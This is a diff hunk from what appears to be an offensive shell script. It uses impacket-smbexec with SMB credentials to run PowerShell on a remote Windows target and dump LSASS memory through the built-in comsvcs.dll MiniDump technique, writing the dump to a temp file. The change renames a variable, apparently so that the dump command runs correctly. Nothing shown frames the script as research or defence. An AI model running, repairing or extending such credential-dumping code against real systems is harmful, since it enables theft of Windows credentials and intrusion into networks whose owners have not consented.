@@ -24,7 +24,7 @@ echo ""
 # Phase 1: Dump LSASS via built-in comsvcs.dll (runs as SYSTEM, no custom exe)
 echo "[*] Phase 1: Dumping LSASS memory..."
 impacket-smbexec "$SMB_USER":"$SMB_PASS"@$TARGET_IP << 'SHELL_EOF' 2>/dev/null
-powershell -c "$pid=(Get-Process lsass).Id; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full"
+powershell -c "$lsass_pid=(Get-Process lsass).Id; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\Windows\Temp\lsass.dmp full"
 exit
 SHELL_EOF
 sleep 3
